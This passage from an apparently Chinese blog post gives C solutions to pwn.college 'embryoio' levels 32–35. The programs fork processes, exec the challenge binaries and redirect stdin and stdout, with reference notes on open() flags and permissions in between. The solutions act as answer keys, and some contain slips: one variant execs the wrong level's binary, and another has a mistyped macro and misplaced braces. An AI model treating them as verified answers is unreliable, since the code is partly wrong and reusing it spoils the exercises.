    childPid=getpid();</span><br><span class="line">        printf(<span class="string">&quot;child pid is %d\n&quot;</span>,childPid);</span><br><span class="line">        pwncollege();</span><br><span class="line">        printf(<span class="string">&quot;ok, i am child,i will leave\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        printf(<span class="string">&quot;parent pid is %d\n&quot;</span>,getpid());</span><br><span class="line">        waitpid(childPid,NULL,<span class="number">0</span>);</span><br><span class="line">        printf(<span class="string">&quot;ok,i am father, i will leae\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Level③②"><a href="#Level③②" class="headerlink" title="Level③②"></a>Level③②</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* <span class="type">const</span> argv[] = &#123; <span class="string">&quot;/challenge/embryoio_level32&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* file = <span class="string">&quot;/challenge/embryoio_level32&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* <span class="type">const</span> envp[] = &#123; <span class="string">&quot;dzsioq=fqenenoweh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    execve(file, argv, envp);</span><br><span class="line">    perror(<span class="string">&quot;execve&quot;</span>); <span class="comment">// Handle error if execve fails</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* env[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> childPid;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">        childPid = getpid();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child pid is %d\n&quot;</span>, childPid);</span><br><span class="line">        pwncollege();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This line will not be reached if execve succeeds.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent pid is %d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok, I am father, I will leave\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="输入重定向：把文件导入到命令中。-输出重定向-：把原本要输出到屏幕的数据信息写入到指定的文件中。"><a href="#输入重定向：把文件导入到命令中。-输出重定向-：把原本要输出到屏幕的数据信息写入到指定的文件中。" class="headerlink" title="输入重定向：把文件导入到命令中。 输出重定向**：把原本要输出到屏幕的数据信息写入到指定的文件中。"></a><strong>输入重定向</strong>：把文件导入到命令中。 输出重定向**：把原本要输出到屏幕的数据信息写入到指定的文件中。</h3><p>STDIN_FILENO：接收键盘的输入</p><p>STDOUT_FILENO：向屏幕输出</p><p>下列是参数flags 所能使用的旗标:</p><p><strong>O_RDONLY</strong> 以只读方式打开文件</p><p><strong>O_WRONLY</strong> 以只写方式打开文件</p><p><strong>O_RDWR</strong></p><p>以可读写方式打开文件。上述三种旗标是互斥的，也就是不可同时使用，但可与下列的旗标利用**OR(|)**运算符组合。</p><p><strong>O_CREAT</strong> 若欲打开的文件不存在则自动建立该文件。</p><p><strong>O_EXCL</strong></p><p>如果<strong>O_CREAT</strong>也被设置，此指令会去检查文件是否存在。文件若不存在则建立该文件，否则将导致打开文件错误。此外，若<strong>O_CREAT</strong>与<strong>O_EXCL</strong>同时设置，并且欲打开的文件为符号连接，则会打开文件失败。</p><p><strong>O_NOCTTY</strong></p><p>如果欲打开的文件为终端机设备时，则不会将该终端机当成进程控制终端机。</p><p><strong>O_TRUNC</strong></p><p>若文件存在并且以可写的方式打开时，此旗标会令文件长度清为0，而原来存于该文件的资料也会消失。</p><p><strong>O_APPEND</strong></p><p>当读写文件时会从文件尾开始移动，也就是所写入的数据会以附加的方式加入到文件后面。</p><p><strong>O_NONBLOCK</strong></p><p>以不可阻断的方式打开文件，也就是无论有无数据读取或等待，都会立即返回进程之中。</p><p><strong>O_NDELAY</strong> 同<strong>O_NONBLOCK。</strong></p><p><strong>O_SYNC</strong> 以同步的方式打开文件。</p><p><strong>O_NOFOLLOW</strong> 如果参数<strong>pathname</strong></p><p>所指的文件为一符号连接，则会令打开文件失败。</p><p><strong>O_DIRECTORY</strong> 如果参数<strong>pathname</strong></p><p>所指的文件并非为一目录，则会令打开文件失败。</p><p><strong>参数mode</strong></p><p>则有下列数种组合，只有在建立新文件时才会生效，此外真正建文件时的权限会受到umask值所影响，因此该文件权限应该为(mode-umaks)。</p><p><strong>S_IRWXU00700</strong>权限，代表该文件所有者具有可读、可写及可执行的权限。</p><p><strong>S_IRUSR</strong>或<strong>S_IREAD</strong>，00400权限，代表该文件所有者具有可读取的权限。</p><p><strong>S_IWUSR</strong> 或<strong>S_IWRITE</strong>，00200权限，代表该文件所有者具有可写入的权限。</p><p><strong>S_IXUSR</strong> 或<strong>S_IEXEC</strong>，00100</p><p>权限，代表该文件所有者具有可执行的权限。<strong>S_IRWXG</strong>00070权限，代表该文件用户组具有可读、可写及可执行的权限。</p><p><strong>S_IRGRP</strong> 00040权限，代表该文件用户组具有可读的权限。</p><p><strong>S_IWGRP</strong>00020权限，代表该文件用户组具有可写入的权限。</p><p><strong>S_IXGRP</strong> 00010权限，代表该文件用户组具有可执行的权限。</p><p><strong>S_IRWXO</strong>00007权限，代表其他用户具有可读、可写及可执行的权限。</p><p><strong>S_IROTH</strong> 00004 权限，代表其他用户具有可读的权限</p><p><strong>S_IWOTH</strong>00002权限，代表其他用户具有可写入的权限。</p><p><strong>S_IXOTH</strong> 00001权限，代表其他用户具有可执行的权限。</p><p>返回值</p><p>若所有欲核查的权限都通过了检查则返回0值，表示成功，只要有一个权限被禁止则返回-1。</p><p>错误代码</p><p><strong>EEXIST</strong> 参数pathname</p><p>所指的文件已存在，却使用了O_CREAT和O_EXCL旗标。</p><p><strong>EACCESS</strong></p><p>参数pathname所指的文件不符合所要求测试的权限。</p><p><strong>EROFS</strong> 欲测试写入权限的文件存在于只读文件系统内。</p><p><strong>EFAULT</strong> 参数pathname指针超出可存取内存空间。</p><p><strong>EINVAL</strong> 参数mode 不正确。</p><p><strong>ENAMETOOLONG</strong> 参数pathname太长。</p><p><strong>ENOTDIR</strong> 参数pathname不是目录。</p><p><strong>ENOMEM</strong> 核心内存不足。</p><p><strong>ELOOP</strong> 参数pathname有过多符号连接问题。</p><p><strong>EIO I&#x2F;O</strong> 存取错误。</p><h3 id="Level③③"><a href="#Level③③" class="headerlink" title="Level③③"></a>Level③③</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *<span class="type">const</span> argv[] = &#123; <span class="string">&quot;/challenge/embryoio_level33&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *file = <span class="string">&quot;/challenge/embryoio_level33&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试执行指定的二进制文件</span></span><br><span class="line">    execvp(file, argv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 execvp 失败，输出错误信息并退出</span></span><br><span class="line">    perror(<span class="string">&quot;execvp&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[], <span class="type">char</span> *env[])</span> &#123;</span><br><span class="line">    <span class="type">pid_t</span> childPid;</span><br><span class="line">    <span class="type">int</span> old_fd = open(<span class="string">&quot;/tmp/tnvecb&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (old_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将文件描述符 old_fd 重定向为标准输入</span></span><br><span class="line">    dup2(old_fd, STDIN_FILENO);</span><br><span class="line">    close(old_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建子进程</span></span><br><span class="line">    childPid = fork();</span><br><span class="line">    <span class="keyword">if</span> (childPid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (childPid == <span class="number">0</span>) &#123; <span class="comment">// 子进程</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child pid is %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行 pwncollege 函数尝试运行指定的二进制文件</span></span><br><span class="line">        pwncollege();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这部分只在 execvp 失败时执行</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok, I am child, I will leave\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 父进程</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent pid is %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等待子进程退出</span></span><br><span class="line">        waitpid(childPid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok, I am father, I will leave\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>open()方法语法格式如下：</p><p>os.open(file, flags[, mode]);</p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>file – 要打开的文件</p><p>flags – 该参数可以是以下选项，多个使用 “|” 隔开：</p><ul><li>os.O_RDONLY: 以只读的方式打开</li><li>os.O_WRONLY: 以只写的方式打开</li><li>os.O_RDWR : 以读写的方式打开</li><li>os.O_NONBLOCK: 打开时不阻塞</li><li>os.O_APPEND: 以追加的方式打开</li><li>os.O_CREAT: 创建并打开一个新文件</li><li>os.O_TRUNC: 打开一个文件并截断它的长度为零（必须有写权限）</li><li>os.O_EXCL: 如果指定的文件存在，返回错误</li><li>os.O_SHLOCK: 自动获取共享锁</li><li>os.O_EXLOCK: 自动获取独立锁</li><li>os.O_DIRECT: 消除或减少缓存效果</li><li>os.O_FSYNC : 同步写入</li><li>os.O_NOFOLLOW: 不追踪软链接</li></ul><h3 id="Level③④"><a href="#Level③④" class="headerlink" title="Level③④"></a>Level③④</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *<span class="type">const</span> argv[] = &#123; <span class="string">&quot;/challenge/embryoio_level34&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *file = <span class="string">&quot;/challenge/embryoio_level34&quot;</span>;</span><br><span class="line"></span><br><span class="line">    execvp(file, argv);</span><br><span class="line"></span><br><span class="line">    perror(<span class="string">&quot;execvp&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[], <span class="type">char</span> *env[])</span> &#123;</span><br><span class="line">    <span class="type">pid_t</span> childPid;</span><br><span class="line">    <span class="type">int</span> old_fd = open(<span class="string">&quot;/tmp/sayucj&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (old_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    dup2(old_fd, STDIN_FILENO);</span><br><span class="line">    close(old_fd);</span><br><span class="line"></span><br><span class="line">    childPid = fork();</span><br><span class="line">    <span class="keyword">if</span> (childPid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (childPid == <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child pid is %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">        pwncollege();</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok, I am child, I will leave\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent pid is %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        waitpid(childPid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok, I am father, I will leave\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GMU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span>*<span class="type">const</span> argv[]=&#123;<span class="string">&quot;/challenge/embryoio_level34&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* file=<span class="string">&quot;/challenge/embryoio_level34&quot;</span>;</span><br><span class="line">execvp(file,argv);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv[],<span class="type">char</span>*env[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> childPid;</span><br><span class="line"><span class="type">int</span> old_fd=open(<span class="string">&quot;/tmp/sayucj&quot;</span>,O_WRONLY);</span><br><span class="line">dup2(old_fd,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (fork()==<span class="number">0</span>)&#123;</span><br><span class="line">childPid=getpid();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;child pid is %d\n&quot;</span>,childPid);</span><br><span class="line">pwncollege();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ok,i am child,i will leave\n&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;parent pid is %d\n&quot;</span>,getpid());</span><br><span class="line">waitpid(childPid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ok,i am father ,i will leave\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Level③⑤"><a href="#Level③⑤" class="headerlink" title="Level③⑤"></a>Level③⑤</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义用于执行特定二进制文件的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *<span class="type">const</span> argv[] = &#123; <span class="string">&quot;/challenge/embryoio_level35&quot;</span>, <span class="literal">NULL</span> &#125;;  <span class="comment">// 指定要执行的二进制文件和参数</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *file = <span class="string">&quot;/challenge/embryoio_level35&quot;</span>;  <span class="comment">// 二进制文件的路径</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭标准输出文件描述符</span></span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 execvp 函数执行指定的二进制文件</span></span><br><span class="line">    execvp(file, argv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 execvp 失败，输出错误信息并退出程序</span></span><br><span class="line">    perror(<span class="string">&quot;execvp&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[], <span class="type">char</span> *env[])</span> &#123;</span><br><span class="line">    <span class="type">pid_t</span> childPid;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打开或创建用于输出的文件，设置文件权限为只读写用户</span></span><br><span class="line">    <span class="type">int</span> old_fd = open(<span class="string">&quot;/tmp/1&quot;</span>, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);</span><br><span class="line">    <span class="keyword">if</span> (old_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将文件描述符 old_fd 重定向为标准输出</span></span><br><span class="line">    dup2(old_fd, <span class="number">1</span>);</span><br><span class="line">    close(old_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空除 LC_CTYPE 外的环境变量</span></span><br><span class="line">    <span class="type">char</span> *new_env[] = &#123; <span class="string">&quot;LC_CTYPE=en_US.UTF-8&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建子进程</span></span><br><span class="line">    childPid = fork();</span><br><span class="line">    <span class="keyword">if</span> (childPid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (childPid == <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child pid is %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 清空环境变量后再执行 pwncollege 函数</span></span><br><span class="line">        execve(<span class="string">&quot;/challenge/embryoio_level34&quot;</span>, argv, new_env);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果 execve 失败，输出错误信息并退出程序</span></span><br><span class="line">        perror(<span class="string">&quot;execve&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent pid is %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等待子进程退出</span></span><br><span class="line">        waitpid(childPid, <span class="literal">NULL</span>, <span 